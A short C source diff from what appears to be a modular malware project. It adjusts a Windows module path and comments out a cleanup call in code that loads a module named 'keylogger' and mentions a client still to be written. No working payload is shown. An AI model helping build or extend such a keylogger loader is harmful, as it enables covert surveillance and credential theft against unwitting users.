@@ -33,7 +33,7 @@ int main(void) {
 #endif
 #ifdef _WIN32
 
-	char *mod_path = "C:\\Users\\User";
+	char *mod_path = "C:\\Users\\User\\";
 #endif
 	char *mods[] = {
 		"keylogger",
@@ -42,7 +42,7 @@ int main(void) {
 
 	load_all_modules(mods, mod_path);
 	list_modules();
-	clean_modules();
+	//clean_modules();
 	/*
 	* Debug code until we write the client
 
